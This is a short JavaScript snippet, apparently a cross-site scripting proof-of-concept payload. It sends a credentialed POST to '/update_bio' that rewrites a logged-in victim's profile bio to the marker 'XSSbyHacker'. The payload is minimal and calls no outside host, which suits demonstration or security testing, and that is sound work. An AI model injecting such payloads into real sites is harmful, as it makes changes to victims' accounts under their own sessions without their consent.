fetch("/update_bio", {
  method: "POST",
  credentials: "include",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    "bio": "XSSbyHacker"
  })
});
